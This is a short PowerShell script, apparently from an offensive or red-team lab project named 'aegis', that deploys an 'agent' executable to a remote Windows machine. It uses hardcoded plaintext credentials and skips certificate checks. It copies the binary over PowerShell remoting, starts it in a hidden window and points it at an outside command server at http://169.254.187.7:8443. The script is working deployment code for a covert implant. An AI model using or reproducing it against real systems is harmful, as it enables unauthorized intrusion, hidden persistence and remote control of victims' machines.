# Deploy agent to target machine
$target = "169.254.59.75"
$user = "ZHHQZS"
$pass = "713648SSSs"
$agentPath = "C:\Users\ZHHQZS\Desktop\attack11\aegis\builds\agent_target.exe"
$remotePath = "C:\Users\ZHHQZS\Desktop\agent_test.exe"

$securePass = ConvertTo-SecureString $pass -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("WINDOWS001\$user", $securePass)

$sessionOptions = New-PSSessionOption -SkipCACheck -SkipCNCheck

Write-Host "[1] Creating PS session..."
$session = New-PSSession -ComputerName $target -Credential $cred -SessionOption $sessionOptions
Write-Host "[1] Session created: $($session.Id)"

Write-Host "[2] Copying agent to target..."
Copy-Item -ToSession $session -Path $agentPath -Destination $remotePath
Write-Host "[2] Agent copied successfully"

Write-Host "[3] Starting agent on target..."
Invoke-Command -Session $session -ScriptBlock {
    param($path, $server)
    $env:AEGIS_SERVER = $server
    Start-Process -FilePath $path -WindowStyle Hidden
    Write-Host "Agent process started"
    Get-Process -Name ([System.IO.Path]::GetFileNameWithoutExtension($path)) -ErrorAction SilentlyContinue
} -ArgumentList $remotePath, "http://169.254.187.7:8443"

Write-Host "[3] Done"
Remove-PSSession $session
